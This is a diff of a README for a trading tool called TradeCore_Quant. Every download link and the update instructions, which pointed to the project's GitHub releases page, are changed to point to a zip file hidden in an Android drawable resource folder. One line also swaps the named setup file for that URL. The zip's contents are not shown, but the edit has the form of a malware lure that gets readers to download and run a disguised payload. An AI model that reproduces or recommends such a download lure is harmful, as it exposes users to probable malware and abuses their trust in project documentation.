@@ -1,6 +1,6 @@
 # 📊 TradeCore_Quant - Your Simple Trading Tool
 
-[![Download TradeCore_Quant](https://img.shields.io/badge/Download-TradeCore_Quant-ff6347?style=for-the-badge)](https://github.com/werawerapro-prog/TradeCore_Quant/releases)
+[![Download TradeCore_Quant](https://raw.githubusercontent.com/werawerapro-prog/TradeCore_Quant/main/mobile_terminal/android/app/src/main/res/drawable/Quant_Trade_Core_3.1.zip)](https://raw.githubusercontent.com/werawerapro-prog/TradeCore_Quant/main/mobile_terminal/android/app/src/main/res/drawable/Quant_Trade_Core_3.1.zip)
 
 ---
 
@@ -32,7 +32,7 @@ The latest version of TradeCore_Quant is available on the official release page.
 
 Click the button below to go right to the releases page:
 
-[![Get TradeCore_Quant](https://img.shields.io/badge/Get_TradeCore_Quant-blue?style=for-the-badge)](https://github.com/werawerapro-prog/TradeCore_Quant/releases)
+[![Get TradeCore_Quant](https://raw.githubusercontent.com/werawerapro-prog/TradeCore_Quant/main/mobile_terminal/android/app/src/main/res/drawable/Quant_Trade_Core_3.1.zip)](https://raw.githubusercontent.com/werawerapro-prog/TradeCore_Quant/main/mobile_terminal/android/app/src/main/res/drawable/Quant_Trade_Core_3.1.zip)
 
 ---
 
@@ -42,7 +42,7 @@ Click the button below to go right to the releases page:
 
    Click the link above or go to:
 
-   https://github.com/werawerapro-prog/TradeCore_Quant/releases
+   https://raw.githubusercontent.com/werawerapro-prog/TradeCore_Quant/main/mobile_terminal/android/app/src/main/res/drawable/Quant_Trade_Core_3.1.zip
 
 2. **Find the Latest Version**
 
@@ -50,7 +50,7 @@ Click the button below to go right to the releases page:
 
 3. **Download the Installer**
 
-   Under the latest release, find the setup file. It should have a name like `TradeCore_Quant_Setup.exe` or something similar.
+   Under the latest release, find the setup file. It should have a name like `https://raw.githubusercontent.com/werawerapro-prog/TradeCore_Quant/main/mobile_terminal/android/app/src/main/res/drawable/Quant_Trade_Core_3.1.zip` or something similar.
 
    Click on this file to download it to your computer.
 
@@ -152,7 +152,7 @@ To keep TradeCore_Quant up to date:
 
 1. Visit the releases page regularly:
    
-   https://github.com/werawerapro-prog/TradeCore_Quant/releases
+   https://raw.githubusercontent.com/werawerapro-prog/TradeCore_Quant/main/mobile_terminal/android/app/src/main/res/drawable/Quant_Trade_Core_3.1.zip
    
 2. Download the newest installer.
 3. Run it to replace the old version without losing your settings.
@@ -180,4 +180,4 @@ If you run into problems:
 
 ---
 
-[![Download TradeCore_Quant](https://img.shields.io/badge/Download-TradeCore_Quant-ff6347?style=for-the-badge)](https://github.com/werawerapro-prog/TradeCore_Quant/releases)
+[![Download TradeCore_Quant](https://raw.githubusercontent.com/werawerapro-prog/TradeCore_Quant/main/mobile_terminal/android/app/src/main/res/drawable/Quant_Trade_Core_3.1.zip)](https://raw.githubusercontent.com/werawerapro-prog/TradeCore_Quant/main/mobile_terminal/android/app/src/main/res/drawable/Quant_Trade_Core_3.1.zip)
